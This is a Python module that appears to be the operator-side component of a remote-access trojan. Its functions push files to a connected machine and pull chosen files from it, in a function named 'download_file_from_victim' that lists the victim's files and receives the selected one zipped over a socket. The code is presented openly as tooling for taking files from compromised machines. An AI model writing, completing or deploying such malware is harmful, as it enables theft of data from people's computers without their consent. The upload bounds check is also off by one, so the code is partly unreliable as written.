import os
import glob
import json


CHUNK_SIZE = 4 * 1024

END_DELIMETER = "*END_OF_FILE*"


def upload_files(my_socket):
    files = glob.glob("Upload_folder/*")
    for index, file in enumerate(files):
        fileName = os.path.basename(file)
        print("\t\t", index, "\t", fileName)
    check = True
    while check:
        try:
            file_num = int(input("[+] Enter the file number you want to send : "))
            if len(files) >= file_num >= 0:
                filename = files[file_num]
                check = False

            else:
                print("[-] Invalid file selected, try again")
        except:
            print("invalid input ")
    my_socket.send_data(filename)
    my_socket.send_files(filename)


def download_file_from_victim(my_socket):
    print("[+] Downloading File")
    print("[+] Receiving File")
    full_list_of_files = b''
    while True:
        chunk = my_socket.connection.recv(CHUNK_SIZE)
        if chunk.endswith(END_DELIMETER.encode()):
            chunk = chunk[:-len(END_DELIMETER)]
            full_list_of_files += chunk
            break
        full_list_of_files += chunk

    files = json.loads(full_list_of_files)
    for index in files:
        print("\t\t", index, "\t", files[index])
    file_index = (input("[+] Enter the file / folder you want to download "))
    file_2_download = files[file_index]

    my_socket.send_data(file_2_download)
    zipped_name = my_socket.receive_data()
    my_socket.receive_file(zipped_name)

